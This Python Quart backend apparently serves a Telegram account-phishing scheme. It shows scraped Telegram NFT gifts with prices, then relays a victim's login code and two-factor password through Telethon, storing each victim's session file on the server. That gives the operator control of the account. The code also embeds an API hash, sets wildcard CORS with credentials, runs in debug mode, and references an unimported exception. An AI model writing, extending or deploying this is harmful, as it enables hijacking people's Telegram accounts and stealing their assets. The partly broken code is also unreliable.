from flask_cors import CORS
import sqlite3
import requests
import os
from bs4 import BeautifulSoup
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from db_func import *
from quart import Quart, request, jsonify

app = Quart(__name__)
CORS(app, supports_credentials=True)

api_id = 2040     
api_hash = "b18441a1ff607e10a989891a5462e627"


SESSION_DIR = "./sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

def get_client_for_user(user_id: int):
    session_file = os.path.join(SESSION_DIR, f"{user_id}.session")
    return TelegramClient(session_file, api_id, api_hash)

def clean_name(name):
    if not name:
        return name

    # Remove trailing `#1234`
    if "#" in name:
        parts = name.rsplit("#", 1)
        # Ensure it's actually an ID
        if parts[1].strip().isdigit():
            return parts[0].strip()

    return name

@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response





def parse_telegram_nft(collection, gift_id):
    url = f"https://t.me/nft/{collection}-{gift_id}"

    try:
        r = requests.get(url, timeout=10)
    except Exception as e:
        return {"error": f"Request failed: {e}"}

    if r.status_code != 200:
        return {"error": f"Tg returned status {r.status_code}"}

    soup = BeautifulSoup(r.text, "html.parser")

    # --- Parse NFT name ---
    name = None
    el = soup.find("meta", property="og:title")
    if el:
        name_raw = el.get("content")
        name = clean_name(name_raw)

    # --- Parse image ---
    image_url = None
    img_el = soup.find("meta", property="og:image")
    if img_el:
        image_url = img_el.get("content")

    # --- Parse attributes ---
    attributes = []
    props = soup.find_all("div")
    for div in props:
        txt = div.get_text(strip=True)
        if ":" in txt and len(txt) < 100:
            k, v = txt.split(":", 1)
            attributes.append({"trait_type": k.strip(), "value": v.strip()})

    return {
        "url": url,
        "name": name,
        "image": image_url,
        "attributes": attributes
    }


    


@app.route("/api/nft")
def api_nft():
    row = get_random_row()
    if not row:
        return jsonify({"error": "No rows"}), 404

    tg = parse_telegram_nft(row["collection"], row["gift_id"])

    # create flat JSON
    response = {
        "collection": row["collection"],
        "gift_id": row["gift_id"],
        "price": row["price"],
        "url": tg.get("url"),
        "name": tg.get("name"),
        "image": tg.get("image"),
        "attributes": tg.get("attributes", [])
    }

    return jsonify(response)


@app.route("/api/phone", methods=["POST"])
async def api_phone():
    data = await request.get_json()
    user_id = data.get("user_id")

    if not user_id:
        return jsonify({"ok": False, "error": "missing user_id"}), 400

    phone = get_num_from_id(user_id)
    if not phone:
        return jsonify({"ok": False, "error": "phone not found"}), 404
    print("trying1")
    try:
        print("trying2")
        client = get_client_for_user(user_id)
        await client.connect()
        await client.send_code_request(phone)
        return jsonify({"ok": True})
    except Exception as e:
        print(e)
        return jsonify({"ok": False, "error": str(e)}), 400


@app.route("/api/code", methods=["POST"])
async def api_code():
    data = await request.get_json()
    user_id = data.get("user_id")
    code = data.get("code")

    if not user_id or not code:
        return jsonify({"ok": False, "error": "missing user_id or code"}), 400

    try:
        client = get_client_for_user(user_id)
        await client.connect()
        phone = get_num_from_id(user_id)

        try:
            await client.sign_in(phone, code)
            return jsonify({"ok": True, "2fa": False})
        except SessionPasswordNeededError:
            print("NEED 2FA AUTH")
            return jsonify({"ok": True, "2fa": True})
        except PhoneCodeInvalidError:
            return jsonify({"ok": False, "error": "invalid code"})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 400


@app.route("/api/2fa", methods=["POST"])
async def api_2fa():
    data = await request.get_json()
    user_id = data.get("user_id")
    password = data.get("password")

    if not user_id or not password:
        return jsonify({"ok": False, "error": "missing user_id or password"}), 400

    try:
        client = get_client_for_user(user_id)
        await client.connect()
        await client.sign_in(password=password)
        return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 400



if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
